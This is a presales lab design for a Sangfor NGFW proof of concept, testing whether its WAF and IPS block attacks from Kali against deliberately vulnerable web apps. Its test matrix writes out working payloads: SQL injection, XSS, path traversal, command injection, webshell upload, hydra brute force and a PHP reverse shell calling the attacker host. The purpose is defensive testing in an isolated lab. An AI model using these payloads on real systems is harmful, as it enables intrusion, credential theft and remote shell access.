# Sangfor NGFW + WAF POC Lab Design

**Date:** 2026-09-16
**Updated:** 2026-09-17 — added OWASP Juice Shop, bWAPP, Mutillidae (all Docker on a single Ubuntu VM)
**Author:** Gunny (Presales / Network Security)
**Status:** Approved — ready for deployment
**Purpose:** Customer POC — demonstrate that Sangfor NGFW (built-in WAF module + IPS) detects and blocks OWASP web attacks and network-level attacks launched from Kali against vulnerable target machines.

---

## 1. Objectives

1. Prove Sangfor NGFW's built-in WAF module blocks classic web attacks (SQLi, XSS, LFI, malicious file upload).
2. Prove NGFW IPS detects network-level activity (port scan, brute force, reverse shell egress).
3. Show clear evidence in NGFW logs for every blocked attack (rule hit, event type, timestamp).
4. Sanity check: legitimate user traffic (LAN client browsing the web app) is NOT blocked (no false positives).

## 2. Scope

| Item | Detail |
|------|--------|
| Product under test | Sangfor NGFW (single appliance, virtual) — WAF module + IPS + App Control built in |
| Targets | DVWA, OWASP Juice Shop, bWAPP, Mutillidae — all Docker on 1 Ubuntu 24.04 VM |
| Attacker | Kali Linux Rolling (VM) |
| Protocol | HTTP only (HTTPS/SSL decryption = future add-on) |
| Network | 4 zones: WAN, VULNSERVER, LAN, MGMT |
| Environment | 100% virtual on Sangfor HCI |

## 3. Topology

```
                         Sangfor HCI
+----------------------------------------------------------------------------------+
|                                                                                  |
|   WAN zone 10.0.0.0/24        VULNSERVER zone 192.168.20.0/24                   |
|   +-------------+             +------------------------------------------------+ |
|   | Kali        |             | Ubuntu 24.04 (Docker apps) — 192.168.20.10     | |
|   | 10.0.0.10   |             |  DVWA :80 | Juice Shop :3000 | bWAPP :8080     | |
|   +------+------+             |  Mutillidae :8081                               | |
|          |                    +------------------------------------------------+ |
|          +------------+    +----------+                                          |
|                       |    |                                                   |
|                 +-----+----+-----+                                             |
|                 |   Sangfor NGFW |                                             |
|                 |  (virtual)     |                                             |
|                 +--+---+---+-----+                                             |
|                    |   |   |                                                   |
|                    |   |   +------> LAN zone 192.168.10.0/24                   |
|                    |   |          +------------------+                         |
|                    |   +---------> MGMT 172.16.1.1   | Client VM 192.168.10.10|
|                    |              +------------------+                         |
+----------------------------------------------------------------------------------+
```

### 3.1 IP Scheme (4 zones)

| Zone | Network | NGFW Interface | Device | IP |
|------|---------|----------------|--------|----|
| WAN | 10.0.0.0/24 | WAN | Kali (attacker) | 10.0.0.10/24, GW 10.0.0.1 |
| WAN | 10.0.0.0/24 | WAN | NGFW WAN (public IP for DNAT) | 10.0.0.1/24 |
| VULNSERVER | 192.168.20.0/24 | DMZ | Ubuntu 24.04 — DVWA + Juice Shop + bWAPP + Mutillidae (Docker) | 192.168.20.10/24, GW 192.168.20.1 |
| VULNSERVER | 192.168.20.0/24 | DMZ | NGFW DMZ | 192.168.20.1/24 |
| LAN | 192.168.10.0/24 | LAN | Client VM (sanity check) | 192.168.10.10/24, GW 192.168.10.1 |
| LAN | 192.168.10.0/24 | LAN | NGFW LAN | 192.168.10.1/24 |
| MGMT | 172.16.1.0/24 | MGMT | NGFW management | 172.16.1.1/24 |

### 3.2 Target Services & Ports

| Target | Service / Port (internal) | Docker container | Notes |
|--------|---------------------------|------------------|-------|
| 192.168.20.10 | DVWA :80 | `vulnerables/web-dvwa` | login admin/password, security low |
| 192.168.20.10 | OWASP Juice Shop :3000 | `bkimminich/juice-shop` | no login needed for attack pages |
| 192.168.20.10 | bWAPP :8080 | `raesene/bwapp` | login bee/bug, run install.php once |
| 192.168.20.10 | Mutillidae :8081 | `webpwnized/mutillidae` | login admin@example.com/admin |

### 3.3 NAT / Traffic Flow

- **DNAT (inbound)** — attacker and legit user both hit the same public IP `10.0.0.1`, all traffic passes through WAF + IPS inspection:

| Public (10.0.0.1) | Internal | Target |
|--------------------|----------|--------|
| :80 | 192.168.20.10:80 | DVWA |
| :3000 | 192.168.20.10:3000 | OWASP Juice Shop |
| :8080 | 192.168.20.10:8080 | bWAPP |
| :8081 | 192.168.20.10:8081 | Mutillidae |

- Kali (WAN) → NGFW public IP:port → DNAT → target. All traffic passes through WAF + IPS inspection.
- Client (LAN) → NGFW public IP:80 → DNAT → DVWA (sanity check path).
- No outbound NAT required from VULNSERVER/LAN (lab-internal).

## 4. NGFW Configuration Steps

1. Assign interfaces to zones: WAN (10.0.0.1), DMZ/VULNSERVER (192.168.20.1), LAN (192.168.10.1), MGMT (172.16.1.1).
2. Enable **WAF module** and **IPS** on the NGFW (features page / security profile).
3. Create security policies:
   - `P1` Allow WAN → VULNSERVER, service HTTP (80), apply profile: WAF + IPS + Anti-Virus + App Control, action: **Deny with alert** for attack matches.
   - `P2` Allow LAN → WAN (client internet, if needed in lab).
   - `P3` Allow LAN → VULNSERVER HTTP (sanity check path), same inspection profile.
   - `P4` Deny all remaining inter-zone traffic (default).
4. Create DNAT policies per section 3.3 table (4 rules: DVWA, Juice Shop, bWAPP, Mutillidae).
5. Enable logging on all policies (event log + traffic log).
6. (Optional) Enable brute-force / login protection profile on WAF for DVWA / bWAPP / Mutillidae login pages.
7. Record NGFW software version + WAF signature/rule version (evidence for the report).

## 5. Test Matrix — Full Kill Chain (MITRE-aligned)

Pass criteria key:
- **PASS** = blocked by NGFW with log evidence
- **PARTIAL** = detected in log but not blocked
- **FAIL** = no detection at all
- **SANITY** = legit traffic must work without blocking

### Phase 1 — Reconnaissance (T1595 Active Scanning)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 1.1 | TCP connect scan | `nmap -sS -sV -p- 10.0.0.1` | IPS scan-detection event logged | PASS/PARTIAL (detect in log) |
| 1.2 | Service/version detection | `nmap -sV -p 80 10.0.0.1` | Same as 1.1 | PASS/PARTIAL |

### Phase 2 — Web Application Attacks (OWASP Top 10)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 2.1 | SQL Injection (GET) | `sqlmap -u "http://10.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="<DVWA session>" --batch` | WAF rule hit — SQLi blocked | PASS |
| 2.2 | SQL Injection (POST) | Burp Repeater / sqlmap on login POST | WAF rule hit — SQLi blocked | PASS |
| 2.3 | Reflected XSS | `curl "http://10.0.0.1/vulnerabilities/xss_r/?name=<script>alert(1)</script>"` | WAF rule hit — XSS blocked | PASS |
| 2.4 | Stored XSS | DVWA `xss_s` form submit with `<script>` payload | WAF rule hit — XSS blocked | PASS |
| 2.5 | Local File Inclusion (LFI) | `curl "http://10.0.0.1/vulnerabilities/fi/?page=../../../../etc/passwd"` | WAF rule hit — path traversal blocked | PASS |
| 2.6 | Malicious file upload (webshell) | Upload `shell.php` via DVWA `upload` page | WAF file filter / IPS blocks upload | PASS |
| 2.7 | Command injection | DVWA `exec` page: `127.0.0.1; whoami` | WAF rule hit — CMDi blocked | PASS |

### Phase 3 — Brute Force (T1110)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 3.1 | Login brute force | `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"` | WAF login-protection / rate limiting triggers | PASS/PARTIAL (detect in log) |

### Phase 4 — Post-Exploitation / Reverse Shell (T1059 + C2 egress)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 4.1 | Reverse shell attempt (if 2.6 upload succeeded) | Kali listener `nc -lvnp 4444`; execute `shell.php` on DVWA | IPS / App Control flags outbound shell (C2 callback) | PASS/PARTIAL |
| 4.2 | PHP reverse shell payload | `php -r '$sock=fsockopen("10.0.0.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` via command injection | IPS detects reverse shell pattern | PASS/PARTIAL |

### Phase 5 — OWASP Juice Shop (web API layer, WAF)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 5.1 | SQLi via search API | `curl "http://10.0.0.1:3000/rest/products/search?q=')) UNION SELECT ..."` | WAF rule hit — SQLi blocked | PASS |
| 5.2 | Reflected XSS via search API | `curl "http://10.0.0.1:3000/rest/products/search?q=<script>alert(1)</script>"` | WAF rule hit — XSS blocked | PASS |
| 5.3 | Default credentials abuse | `curl -X POST http://10.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'` | WAF / login protection flags credential abuse | PASS/PARTIAL |

### Phase 6 — bWAPP (OWASP Top 10, WAF)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 6.1 | OS command injection | `curl "http://10.0.0.1:8080/commandi.php?ip=127.0.0.1%3B+whoami"` (after bee/bug login) | WAF rule hit — CMDi blocked | PASS |
| 6.2 | XXE (XML External Entity) | POST XML with `file:///etc/passwd` entity to `http://10.0.0.1:8080/xxe-1.php` | WAF rule hit — XXE blocked | PASS |
| 6.3 | SQLi (GET) | `curl "http://10.0.0.1:8080/sqli-1.php?title=1%27+OR+1%3D1--&action=search"` | WAF rule hit — SQLi blocked | PASS |
| 6.4 | Reflected XSS | `curl "http://10.0.0.1:8080/xss-get-1.php?firstname=<script>alert(1)</script>&lastname=x&form=submit"` | WAF rule hit — XSS blocked | PASS |

### Phase 7 — Mutillidae (OWASP Top 10, WAF)

| # | Test | Tool / Command (from Kali) | Expected NGFW Action | Pass Criteria |
|---|------|---------------------------|----------------------|---------------|
| 7.1 | Login SQLi | `curl "http://10.0.0.1:8081/index.php?page=user-info.php&username=1%27+OR+1%3D1--&password=x&user-info-php-submit-button=View+Account+Details"` | WAF rule hit — SQLi blocked | PASS |
| 7.2 | DNS lookup CMDi | `curl "http://10.0.0.1:8081/index.php?page=dns-lookup.php&target_host=127.0.0.1%3B+whoami&dns-lookup-php-submit-button=Lookup+DNS"` | WAF rule hit — CMDi blocked | PASS |
| 7.3 | Reflected XSS | `curl "http://10.0.0.1:8081/index.php?page=dns-lookup.php&target_host=<script>alert(1)</script>"` | WAF rule hit — XSS blocked | PASS |

### Phase 8 — Sanity Check (no false positives)

| # | Test | Tool | Expected Result | Pass Criteria |
|---|------|------|-----------------|---------------|
| 8.1 | Legit browsing | Client VM (LAN) opens `http://10.0.0.1/` | Page loads, login works, DVWA pages usable | SANITY PASS |
| 8.2 | Legit login | Client VM logs into DVWA (admin/password) | Login succeeds, no WAF block | SANITY PASS |

## 6. Evidence Capture Checklist

For every test case, capture:

1. **NGFW WAF/IPS event log** — screenshot: rule ID, signature name, source/dest IP, timestamp, action taken.
2. **Attack output** — Kali terminal screenshot showing payload + response (block page / 403 / dropped connection).
3. **Traffic log** — session allowed vs denied for the test flow.
4. **Sanity check** — client browsing screenshot (proves no false positive).
5. Log the NGFW signature version used on test day.

## 7. Success Criteria (Overall)

- 100% of web-attack cases (Phases 2, 5, 6, 7) = PASS (blocked with WAF log evidence).
- Phases 1/3/4 = at minimum PARTIAL (detected in logs), PASS preferred.
- Phase 8 sanity = PASS (legit traffic not blocked).
- Deliver a summary table: test # / tool / payload / NGFW rule ID / result — for the customer report.

## 8. Future Add-ons (Out of Current Scope)

- HTTPS + SSL decryption test (WAF inspection of encrypted traffic).
- Standalone Sangfor WAF appliance in front of NGFW (layered demo).
- Metasploitable 2 VM (needs a second VM) for network-layer exploits (vsftpd backdoor, ms08-067, SSH brute force) — script was removed to keep the lab on a single VM.
- Metasploitable 3 (Windows) VM for Windows-target exploits (build via Packer, import to HCI).
- Burp Suite full scan as attacker automation.

## 9. References

- Deployment steps: `README-deploy.md`
- Vuln server deploy script (DVWA + Juice Shop + bWAPP + Mutillidae): `deploy-vulnserver.sh`
- Kali prep script: `deploy-kali-prep.sh`
- Attack automation (all targets): `auto-attack.sh`